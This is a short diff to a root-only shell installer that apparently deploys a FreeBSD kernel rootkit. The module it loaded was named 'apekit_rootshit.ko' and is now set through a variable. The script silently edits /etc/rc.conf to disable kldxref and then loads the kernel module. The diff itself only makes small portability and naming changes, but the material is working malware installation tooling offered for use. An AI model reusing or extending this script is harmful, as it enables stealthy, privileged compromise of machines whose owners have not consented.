@@ -1,6 +1,6 @@
 #!/bin/sh
 
-if [ "$EUID" -ne 0 ]; then
+if [ "$(id -u)" -ne 0 ]; then
    echo "Must be root to run this"
    exit 1
 fi
@@ -40,4 +40,4 @@ fi
 # Disable kldxref by setting kldxref_enable="NO"
 sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
-kldload apekit_rootshit.ko
+kldload "$LKM_NAME"
